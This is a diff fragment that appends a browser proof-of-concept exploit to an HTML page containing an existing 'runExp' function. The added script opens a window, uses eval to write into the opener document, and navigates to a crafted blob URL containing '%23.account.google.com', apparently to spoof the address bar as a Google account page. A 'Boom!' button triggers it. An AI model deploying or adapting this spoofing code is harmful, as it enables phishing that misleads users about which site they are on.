@@ -66,3 +66,13 @@ function runExp(idx) {
 </script>
 </body>
 </html>
+
+
+<script>
+  function poc(){
+    w=window.open('about:blank','_blank');
+    w.eval('setTimeout("opener.document.write(/pkav~/);opener.focus();window.close();",2000)');
+      setTimeout("location='blob:"+location.protocol+"//"+location.host+"%23.account.google.com/';",1000)
+  }
+</script>
+<button onclick="poc()">Boom!</button>
